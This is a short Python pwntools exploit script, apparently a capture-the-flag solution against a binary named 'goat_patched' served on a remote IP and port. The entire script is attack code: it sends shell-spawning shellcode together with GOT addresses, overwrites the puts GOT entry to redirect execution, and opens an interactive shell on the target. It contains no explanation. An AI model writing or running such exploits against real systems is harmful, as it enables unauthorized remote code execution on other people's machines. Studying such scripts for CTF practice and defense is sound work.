#!/usr/bin/env python3

from pwn import *

exe = ELF("./goat_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("198.211.116.222",9001)

    pause()
    r.sendlineafter(" :", asm(shellcraft.sh()) + p32(exe.got['puts']))
    r.sendlineafter(" :", str(exe.got['puts']))
    r.sendlineafter(" :", p32(exe.sym['nickname']))


    r.interactive()


if __name__ == "__main__":
    main()
